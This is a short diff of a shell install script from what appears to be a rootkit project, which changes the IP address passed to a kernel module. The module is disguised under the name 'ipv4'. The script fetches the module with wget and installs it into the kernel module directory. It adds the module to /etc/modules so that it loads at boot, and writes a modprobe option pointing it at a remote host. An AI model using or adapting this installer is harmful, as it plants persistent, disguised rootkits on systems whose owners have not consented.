@@ -7,7 +7,7 @@ wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmod
 # persistence (load le module au demarage)
 echo "ipv4" >> /etc/modules
 mkdir -p /lib/modules/$(uname -r)/extra
-echo "options ipv4 ip=192.168.1.37" > /etc/modprobe.d/ipv4.conf
+echo "options ipv4 ip=172.31.28.1" > /etc/modprobe.d/ipv4.conf
 cp ipv4.ko /lib/modules/$(uname -r)/extra/
 depmod -a
 
